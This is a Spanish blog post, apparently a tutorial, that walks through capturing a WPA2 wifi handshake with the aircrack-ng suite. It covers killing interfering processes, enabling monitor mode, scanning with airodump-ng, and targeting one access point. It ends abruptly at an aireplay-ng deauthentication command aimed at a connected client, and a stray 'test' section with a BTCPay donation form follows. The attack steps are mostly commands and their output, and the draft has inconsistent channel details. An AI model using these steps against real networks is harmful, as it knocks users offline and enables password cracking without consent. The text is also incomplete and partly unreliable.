---
layout: single
title: Captura de Handshake usando la suit de Aircrack-ng 
excerpt: "En este post te enseñaré a capturar un handshake de una red wifi utilizando la suite Aircrak-ng."
date: 28-02-2022
classes: wide
header:
  teaser: /assets/images/handshake capture_01/47-477852_this-free-icons-png-design-of-handshake-002-PhotoRoom.png
  teaser_home_page: true
  icon: 
categories:


tags:


---

En este post te enseñaré a capturar un handshake de una red wifi utilizando la suite Aircrak-ng con el método de desautenticación.

Un handshake es una petición entre un cliente y un punto de acceso para establecer una conexión. Cuando capturamos un Handshake, no se captura la contraseña, sino una serie de parámetros, donde está la contraseña Wifi pero cifrada.


## Antes de empezar

Para la captura del handshake, es necesario tener un adaptador wifi que permita habilitar el modo monitor, esto es necesario para poner nuestro adaptador en modo escucha.
En este caso yo estoy utilizando un adaptador de la marca Alfa, modelo AWUS1900, para más información sobre adaptadores puedes consultar las recomendaciones de la página de [aircrack-ng](https://www.aircrack-ng.org/doku.php?id=faq) o el listado de [kalitut](https://kalitut.com/usb-wi-fi-adapters-supporting-monitor/)

[![](/assets/images/handshake capture_01/antena_pwq.png)](https://www.amazon.es/Alfa-Network-AWUS1900-802-11ac-adapter/dp/B01MZD7Z76/ref=sr_1_1?__mk_es_ES=%C3%85M%C3%85%C5%BD%C3%95%C3%91&crid=2Z3VD0ZAFT97J&keywords=awus+1900&qid=1646076976&sprefix=awus+1900%2Caps%2C950&sr=8-1)


## Punto de inicio

Lo primero que necesitamos hacer es identificar nuestras interfaces, para ello utilizaremos el comando `iwconfig`:

```
┌[parrot]─[00:00-00/00]─[/home/masiouslow]
└╼masiouslow$iwconfig       
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0     IEEE 802.11  ESSID:"Hello_world"  
          Mode:Managed  Frequency:5.24 GHz  Access Point: 50:77:B3:EE:65:33   
          Bit Rate=292.5 Mb/s   Tx-Power=17 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=52/70  Signal level=-58 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0

wlx00c0caab5835  unassociated  Nickname:"WIFI@RTL8814AU"
          Mode:Managed  Frequency=2.412 GHz  Access Point: Not-Associated   
          Sensitivity:0/0  
          Retry:off   RTS thr:off   Fragment thr:off
          Power Management:off
          Link Quality=0/100  Signal level=0 dBm  Noise level=0 dBm
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0

```
Esto nos sirve para identificar cuál es el adaptador con el que trabajaremos, en mi caso es: `wlx00c0caab5835` también podemos ver en que estado se encuentra: `Mode:Managed`


## Matar los procesos que interfieren

El siguiente paso consiste en matar los procesos que interfieren con la suite de Aircrak-ng, podrían causar un mal funcionamiento, para ello ejecutamos el comando `sudo airmon-ng check kill`:

```
┌[parrot]─[00:00-00/00]─[/home/masiouslow]
└╼masiouslow$sudo airmon-ng check kill
[sudo] password for masiouslow: 

Killing these processes:

    PID Name
    798 wpa_supplicant

```
El parámetro `check` lista los procesos que interfieren, `kill` los elimina.


## Modo monitor
Ahora activaremos el modo monitor, esto permite que nuestro adaptador pueda capturar paquetes.

Para activar el modo monitor existen varias opciones, esta vez lo aré con la herramienta airmon-ng.

Introducimos en la terminal el siguiente comando `sudo airmon-ng start wlx00c0caab5835` en tu caso has de substituir `wlx00c0caab5835` por el nombre de tu adaptador.

```
┌[parrot]─[00:00-00/00]─[/home/masiouslow]
└╼masiouslow$sudo airmon-ng start wlx00c0caab5835
[sudo] password for masiouslow: 


PHY	Interface	Driver		Chipset

phy0	wlan0		rtw_8822be	Realtek Semiconductor Co., Ltd. RTL8822BE 802.11a/b/g/n/ac WiFi adapter
phy1	wlx00c0caab5835	rtl8814au	Realtek Semiconductor Corp. RTL8814AU 802.11a/b/g/n/ac
		(monitor mode enabled)

```

Es posible que al ejecutar este comando el nombre del adaptador cambie y se agregue la terminación `mon` al nombre original, en mi caso no, pero se ha de  tener en cuenta.

Para verificar que lo hemos hecho correctamente podemos escribir de nuevo `iwconfig`:

```
┌[parrot]─[00:00-00/00]─[/home/masiouslow]
└╼masiouslow$iwconfig       
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Frequency:5.24 GHz  Access Point: Not-Associated   
          Tx-Power=23 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
wlx00c0caab5835  IEEE 802.11AC  ESSID:"MIWIFI_d6hP"  Nickname:"WIFI@RTL8814AU"
          Mode:Monitor  Frequency:2.457 GHz  Access Point: 50:78:B3:EE:61:35   
          Sensitivity:0/0  
          Retry:off   RTS thr:off   Fragment thr:off
          Power Management:off
          Link Quality=1/100  Signal level=-99 dBm  Noise level=0 dBm
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
```
Después de esto vemos que el estado ya ha cambiado a modo monitor `Mode:Monitor`

## Descubrir redes wifi disponibles

Para fijar un objetivo primero necesitamos escanear los puntos de acceso que tenemos a nuestro alcance.

Lo que haremos ahora será listar los puntos de acceso de toda la red,  aparte de definir un objetivo claro nos permite tener un poco más de información


el comando para realizar este listado es `sudo airodump-ng wlx00c0caab5835` pero recuerda que dependiendo del nombre de tu adaptador tendrás que cambiar el último parámetro:

```
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
                                                                                   
 1C:B0:44:4C:CD:2F  -47       62        0    0   1  195   WPA2 CCMP   PSK  Atacks_this
 
 43-05-D9-79-A0-11  -73       60       16    0   1  130   WPA2 CCMP   PSK  Test_1
 
 23-C9-8C-B7-B5-18  -72       66       13    0   6  130   WPA2 CCMP   PSK  Test_2 
 
 64-FE-B8-8E-FB-F7  -75       62        5    0   1  130   WPA2 CCMP   PSK  Test_3
 
 96-BD-08-0E-FD-AA  -76       70       18    0  11  130   WPA2 CCMP   PSK  Test_4
 
 BA-F0-C0-20-C1-23  -76       38        9    0  11  130   WPA2 CCMP   PSK  Test_5
 
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 F4:69:42:90:FD:AF  7C-1D-00-52-8F-68  -83    0 - 1      0        2
```
Una vez listado nuestro objetivo podemos detener el proceso de búsqueda `Ctrl+C`:
```
Quitting...
```
Una vez hecho esto vamos a recolectar la información que nos será útil al momento de capturar el handshake.

Lo que vamos a necesitar es la dirección mac de la red `(BSSID)` y el canal `(CH)` los demás datos nos aportan también mucha información, si quieres profundizar en el tema te recomiendo que visites la guía de [Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng)

La red que voy a atacar es la que se llama `Atacks_this` como podemos ver el BSSID es `1C:B0:44:4C:CD:2F` y está en el canal `1`.

## Nos centramos en el objetivo

Con los datos previamente obtenidos vamos a escanear solamente a nuestro objetivo, esto nos permite ver con facilidad los clientes que están conectados a la red.
Esto lo pedemos hacer con el mismo comando de antes, pero agregando -d más el BSSID `sudo airodump-ng wlx00c0caab5835 -d 1C:B0:44:4C:CD:2F`:
```
CH 1 ][ Elapsed: 24 s ][ 2022-03-06 20:45

BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID

1C:B0:44:4C:CD:2F -28 85 0 0 11 130 WPA2 CCMP PSK Try_to_hack_this

BSSID STATION PWR Rate Lost Frames Notes Probes

```
Podemos ver que ahora solo nos muestra la red a la que queremos atacar, si nos fijamos en la segunda fila, debajo de donde pone STATION no aparece nada, eso es porque no hay ningún cliente conectado a la red, voy a conectar un móvil para que veas la diferencia:

```
CH 2 ][ Elapsed: 0 s ][ 2022-03-06 20:52

BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID

1C:B0:44:4C:CD:2F -29 15 3 0 11 130 WPA2 CCMP PSK Try_to_hack_this

BSSID STATION PWR Rate Lost Frames Notes Probes

1C:B0:44:4C:CD:2F 28:16:7F:6D:4C:2C -45 0 - 1e 141 23
```
Ahora sí, vemos que hay un cliente `28:16:7F:6D:4C:2C` conectado al punto de acceso

Con esto ya tendríamos todos los datos que necesitamos para la captura del handshake

## A la espera de un handshake
A continuación nos vamos a poner en escucha, a la espera de capturar un handshake.
Abrimos una nueva ventana y ejecutamos este comando ```sudo airodump-ng -w test1 -c 11 --bssid 1C:B0:44:4C:CD:2F wlx00c0caab5835```:

```
 CH  1 ][ Elapsed: 2 mins ][ 2022-03-19 20:32 ][ fixed channel wlx00c0caab5835: 2 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 1C:B0:44:4C:CD:2F  -27  14      305       16    0  11  130   WPA2 CCMP   PSK  Try_to_hack_this                       

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 1C:B0:44:4C:CD:2F  28:16:7F:6D:4C:2C  -30    1e- 1e   125      137 
```
En `-w test` asignamos el nombre del archivo con el que queremos que se guarde nuestro handshake.

Con `-c 11` escogemos el canal en el que opera nuestro objetivo

Asignamos el punto de acceso con `--bssid 1C:B0:44:4C:CD:2F`

Y por último seleccionamos nuestro adaptador de red `wlx00c0caab5835`


## Ataque de desautenticación
En otra ventana ejecutamos el comando `sudo aireplay-ng -0 1 -a 1C:B0:44:4C:CD:2F -c 28:16:7F:6D:4C:2C wlx00c0caab5835`




## test 
<style> .btcpay-form { display: inline-flex; align-items: center; justify-content: center; } .btcpay-form--inline { flex-direction: row; } .btcpay-form--block { flex-direction: column; } .btcpay-form--inline .submit { margin-left: 15px; } .btcpay-form--block select { margin-bottom: 10px; } .btcpay-form .btcpay-custom-container{ text-align: center; }.btcpay-custom { display: flex; align-items: center; justify-content: center; } .btcpay-form .plus-minus { cursor:pointer; font-size:25px; line-height: 25px; background: #DFE0E1; height: 30px; width: 45px; border:none; border-radius: 60px; margin: auto 5px; display: inline-flex; justify-content: center; } .btcpay-form select { -moz-appearance: none; -webkit-appearance: none; appearance: none; color: currentColor; background: transparent; border:1px solid transparent; display: block; padding: 1px; margin-left: auto; margin-right: auto; font-size: 11px; cursor: pointer; } .btcpay-form select:hover { border-color: #ccc; } .btcpay-form option { color: #000; background: rgba(0,0,0,.1); } .btcpay-input-price { -moz-appearance: textfield; border: none; box-shadow: none; text-align: center; font-size: 25px; margin: auto; border-radius: 5px; line-height: 35px; background: #fff; }.btcpay-input-price::-webkit-outer-spin-button, .btcpay-input-price::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; } </style>
<form method="POST" action="https://mainnet.demo.btcpayserver.org/api/v1/invoices" class="btcpay-form btcpay-form--inline">
  <input type="hidden" name="storeId" value="HSCNd3KcSaCLuYgHhCoa1NdSppV7GiH4QbZcVYvBTvCk" />
  <div class="btcpay-custom-container">
    <div class="btcpay-custom">
      <button class="plus-minus" type="button" onclick="handlePlusMinus(event);return false" data-type="-" data-step="1" data-min="1" data-max="20">-</button>
      <input class="btcpay-input-price" type="number" name="price" min="1" max="20" step="1" value="1" data-price="1" style="width:3em;" oninput="handlePriceInput(event);return false" />
      <button class="plus-minus" type="button" onclick="handlePlusMinus(event);return false" data-type="+" data-step="1" data-min="1" data-max="20">+</button>
    </div>
    <select name="currency">
      <option value="USD" selected>USD</option>
      <option value="GBP">GBP</option>
      <option value="EUR">EUR</option>
      <option value="BTC">BTC</option>
    </select>
  </div>
  <input type="image" class="submit" name="submit" src="https://mainnet.demo.btcpayserver.org/img/paybutton/pay.svg" style="width:209px" alt="Pay with BTCPay Server, a Self-Hosted Bitcoin Payment Processor">
</form>
<script>
    function handlePlusMinus(event) {
        event.preventDefault();
        const root = event.target.closest('.btcpay-form');
        const el = root.querySelector('.btcpay-input-price');
        const step = parseInt(event.target.dataset.step) || 1;
        const min = parseInt(event.target.dataset.min) || 1;
        const max = parseInt(event.target.dataset.max);
        const type = event.target.dataset.type;
        const price = parseInt(el.value) || min;
        if (type === '-') {
            el.value = price - step < min ? min : price - step;
        } else if (type === '+') {
            el.value = price + step > max ? max : price + step;
        }
    }
    
    function handlePriceInput(event) {
        event.preventDefault();
        const root = event.target.closest('.btcpay-form');
        const price = parseInt(event.target.dataset.price);
        if (isNaN(event.target.value)) root.querySelector('.btcpay-input-price').value = price;
        const min = parseInt(event.target.getAttribute('min')) || 1;
        const max = parseInt(event.target.getAttribute('max'));
        if (event.target.value < min) {
            event.target.value = min;
        } else if (event.target.value > max) { 
            event.target.value = max;
        }
    }
</script>
